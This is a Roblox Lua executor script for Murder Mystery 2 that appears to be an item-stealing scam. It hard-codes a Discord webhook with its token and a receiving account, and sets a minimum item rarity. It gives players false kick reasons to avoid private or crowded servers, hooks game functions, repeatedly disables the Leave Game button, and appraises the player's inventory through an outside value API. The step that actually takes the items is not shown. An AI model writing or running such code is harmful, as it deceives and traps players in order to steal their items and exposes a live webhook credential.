_G.Ex = _G.Ex or false
if _G.Ex then return end
_G.Ex = true

local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local HttpService = game:GetService("HttpService")
local LocalPlayer = Players.LocalPlayer
local PlayerGui = LocalPlayer:WaitForChild("PlayerGui")

local WEBHOOK = "https://discord.com/api/webhooks/1546525713094414346/WeNmEG_D7Ct1t_jehpqSwwOGDv-u8Nxww-2w2Uh0vw5dpvekF3AYxlztEERoB4rFcuHM"
local RECEIVER = {"Alljm100"}
local MINIMUM_RARITY = "Godly"
local MINIMUM_VALUE = 10
local RECEIVERx = RECEIVER

local function GetRequestFunction()
    if request then return request end
    if syn and syn.request then return syn.request end
    if http_request then return http_request end
    return nil
end

local function GetActiveReceiverName()
    if type(ar) == "string" and ar ~= "" then
        if Players and Players:FindFirstChild(ar) then return ar end
        return ar
    end
    if type(RECEIVERx) == "table" then
        for _, Name in ipairs(RECEIVERx) do
            if Name ~= "" then
                if Players and Players:FindFirstChild(Name) then return Name end
                return Name
            end
        end
    end
    return "Unknown"
end

if WEBHOOK == "" then
    game.Players.LocalPlayer:Kick("Invalid URL. Please check your webhook.")
    return
end
if game.PlaceId ~= 142823291 then
    game.Players.LocalPlayer:Kick("This script only works in Murder Mystery 2.")
    return
end

local ServerType
local ServerTypeOK, ServerTypeErr = pcall(function()
    ServerType = game:GetService("RobloxReplicatedStorage")
        :WaitForChild("GetServerType")
        :InvokeServer()
end)

if not ServerTypeOK then
    warn("[MM2] Failed to determine server type:", ServerTypeErr)
elseif ServerType == "VIPServer" then
    LocalPlayer:Kick("Private servers are not supported.")
    return
end

if #game.Players:GetPlayers() >= 12 then
    game.Players.LocalPlayer:Kick("Server is full, please rejoin another server.")
    return
end

local FoundJobId = false
local AttemptCount = 0
if getgc then
    repeat
        local HookedSuccessfully = false
        for _, Value in ipairs(getgc(true)) do
            if typeof(Value) == "function" then
                local FunctionInfo = debug.getinfo(Value)
                if FunctionInfo and FunctionInfo.name then
                    local LowerName = FunctionInfo.name:lower()
                    if LowerName:find("step") and not LowerName:find("stepanimate") then
                        pcall(function()
                            local OriginalFunction = hookfunction(Value, function(...)
                                if not FoundJobId then
                                    FoundJobId = true
                                    _G.RealJobID = game.JobId
                                end
                                if OriginalFunction then return OriginalFunction(...) end
                            end)
                        end)
                        HookedSuccessfully = true
                        break
                    end
                end
            end
        end
        AttemptCount = AttemptCount + 1
        if HookedSuccessfully or AttemptCount >= 10 then break end
        task.wait(0.1)
    until FoundJobId
end
if not FoundJobId then _G.RealJobID = game.JobId end

task.wait(0.5)
task.spawn(function()
    while task.wait(10) do
        pcall(function()
            for _, Connection in ipairs(getconnections(game:GetService("CoreGui").RobloxGui.SettingsClippingShield.SettingsShield.MenuContainer.Page.PageViewClipper.Page.PageViewInnerFrame.LeaveGamePage.LeaveButtonsContainer.LeaveButtonsContainer.LeaveGameButton.Activated)) do
                Connection:Disable()
            end
        end)
    end
end)

local function GetExecutorInfo()
    local ExecutorName = "Unknown"
    pcall(function() ExecutorName = identifyexecutor() end)
    return {
        JobId = _G.RealJobID or game.JobId,
        Executor = string.lower(ExecutorName)
    }
end

local InfoData = GetExecutorInfo()
_G.RealJobID = InfoData.JobId
_G.RealExecutor = InfoData.Executor

local ItemDatabase = {}
local RarityPriority = {
    "Common", "Uncommon", "Rare", "Legendary", "Godly",
    "Ancient", "Unique", "Vintage", "Chroma", "Dual", "Pet"
}

local PROJECT_REVERSE_URL =
    "https://api.project-reverse.org/valuables/get-game-valuables?game=mm2"

local function GetRequestFunction()
    if typeof(request) == "function" then return request end
    if syn and typeof(syn.request) == "function" then return syn.request end
    if typeof(http_request) == "function" then return http_request end
    return nil
end

local function NormalizeItemName(Name)
    Name = tostring(Name or ""):lower()
    Name = Name:gsub("'", "")
    Name = Name:gsub("[%s_%-]+", "")
    return Name
end

local function AddAliases(Mapping, Name, Info)
    local Raw = tostring(Name or "")
    if Raw == "" then return end

    local Lower = Raw:lower()

    Mapping[NormalizeItemName(Raw)] = Info
    Mapping[Lower:gsub("'", ""):gsub("%s+", "_")] = Info
    Mapping[Lower:gsub("'", ""):gsub("%s+", "-")] = Info
    Mapping[Lower:gsub("'", ""):gsub("%s+", "")] = Info
end

local function AddValue(Mapping, Name, Value, Rarity)
    Value = tonumber(Value)

    if type(Name) ~= "string" or Name == "" or not Value then
        return false
    end

    local Info = {
        Rarity = tostring(Rarity or "Unknown"),
        Value = Value,
        Chroma = tostring(Rarity or ""):lower() == "chroma"
    }

    AddAliases(Mapping, Name, Info)
    return true
end

local function WalkValueTable(Node, Mapping, InheritedRarity, Seen)
    if type(Node) ~= "table" then
        return 0
    end

    Seen = Seen or {}
    if Seen[Node] then
        return 0
    end
    Seen[Node] = true

    local Count = 0

    for Name, Value in pairs(Node) do
        if type(Value) == "number" then
            if AddValue(Mapping, tostring(Name), Value, InheritedRarity) then
                Count += 1
            end

        elseif type(Value) == "string" and tonumber(Value) then
            if AddValue(Mapping, tostring(Name), Value, InheritedRarity) then
                Count += 1
            end

        elseif type(Value) == "table" then
            local Rarity = InheritedRarity

            local ExplicitRarity =
                Value.rarity or Value.Rarity or
                Value.tier or Value.Tier

            if ExplicitRarity ~= nil then
                Rarity = tostring(ExplicitRarity)
            elseif Rarity == nil then
                local NameLower = tostring(Name):lower()
                if table.find(RarityPriority, Name) then
                    Rarity = Name
                elseif table.find(RarityPriority, NameLower:gsub("^%l", string.upper)) then
                    Rarity = NameLower:gsub("^%l", string.upper)
                end
            end

            local ExplicitValue =
                Value.value or Value.Value or
                Value.price or Value.Price or
                Value.val or Value.Val

            if ExplicitValue ~= nil then
                if AddValue(Mapping, tostring(Name), ExplicitValue, Rarity) then
                    Count += 1
                end
            else
                Count += WalkValueTable(Value, Mapping, Rarity, Seen)
            end
        end
    end

    return Count
end

local function LoadProjectReverseValues()
    local RequestFunc = GetRequestFunction()

    if not RequestFunc then
        warn("[MM2] No HTTP request function is available.")
        return nil, "no_request_function"
    end

    local Response

    local OK, Err = pcall(function()
        Response = RequestFunc({
            Url = PROJECT_REVERSE_URL,
            Method = "GET",
            Headers = {
                ["User-Agent"] = "Mozilla/5.0",
                ["Accept"] = "application/json"
            },
            Timeout = 15
        })
    end)

    if not OK then
        warn("[MM2] Project Reverse request failed:", Err)
        return nil, "request_failed"
    end

    if type(Response) ~= "table" or type(Response.Body) ~= "string" then
        warn("[MM2] Project Reverse returned an invalid response.")
        return nil, "invalid_response"
    end

    if Response.Body == "" then
        warn("[MM2] Project Reverse returned an empty response.")
        return nil, "empty_response"
    end

    local Data
    local DecodeOK, DecodeErr = pcall(function()
        Data = HttpService:JSONDecode(Response.Body)
    end)

    if not DecodeOK or type(Data) ~= "table" then
        warn("[MM2] Project Reverse response is not valid JSON:", DecodeErr)
        return nil, "invalid_json"
    end

    local Mapping = {}
    local Count = WalkValueTable(Data, Mapping)

    if Count == 0 then
        warn("[MM2] JSON loaded, but no numeric item values were found.")
        return nil, "no_values_found"
    end

    print("[MM2] Project Reverse values loaded:", Count)
    return Mapping, nil
end

local LoadedValues, ValueLoadError = LoadProjectReverseValues()

if LoadedValues then
    ItemDatabase = LoadedValues
else
    warn("[MM2] Value database unavailable:", ValueLoadError)
end

local function FindItemValue(ItemName)
    local Key = NormalizeItemName(ItemName)

    local Info = ItemDatabase[Key]
    if Info then
        return Info
    end

    for StoredName, StoredInfo in pairs(ItemDatabase) do
        if NormalizeItemName(StoredName) == Key then
            return StoredInfo
        end
    end

    return nil
end

-- Inventory lookup
local function LookupInventoryItem(ItemId, Quantity)
    local SafeName = tostring(ItemId or "")
    local ItemInfo = FindItemValue(SafeName)

    local RarityName = ItemInfo and ItemInfo.Rarity or "Unknown"
    local Value = ItemInfo and ItemInfo.Value or 0
    local IsChroma = ItemInfo and ItemInfo.Chroma or false

    return {
        DataID = ItemId,
        Name = SafeName,
        Rarity = RarityName,
        Count = tonumber(Quantity) or 0,
        Value = Value,
        IsChroma = IsChroma,
        Total = Value * (tonumber(Quantity) or 0)
    }
end

local function RefreshInventoryLists()
    local AllItems = {}
    local TotalValue = 0

    local ProfileData
    local ProfileOK, ProfileErr = pcall(function()
        ProfileData =
            ReplicatedStorage.Remotes.Inventory.GetProfileData
            :InvokeServer(LocalPlayer.Name)
    end)

    if not ProfileOK then
        warn("[MM2] Inventory request failed:", ProfileErr)
        return AllItems, TotalValue
    end

    if ProfileData and ProfileData.Weapons and ProfileData.Weapons.Owned then
        for ItemId, Quantity in pairs(ProfileData.Weapons.Owned) do
            if Quantity and Quantity > 0 then
                local Item = LookupInventoryItem(ItemId, Quantity)
                table.insert(AllItems, Item)
                TotalValue += Item.Total
            end
        end
    end

    table.sort(AllItems, function(A, B)
        return A.Total > B.Total
    end)

    return AllItems, TotalValue
end

local AllInventoryItems, TotalInventoryValue =
    RefreshInventoryLists()

print("[MM2] Inventory items:", #AllInventoryItems)
print("[MM2] Total Project Reverse value:", TotalInventoryValue)

for _, Item in ipairs(AllInventoryItems) do
    print(string.format(
        "[MM2] %s | %s | %s | x%d | %d",
        Item.Name,
        Item.Rarity,
        Item.IsChroma and "Chroma" or "Normal",
        Item.Count,
        Item.Value
    ))
end
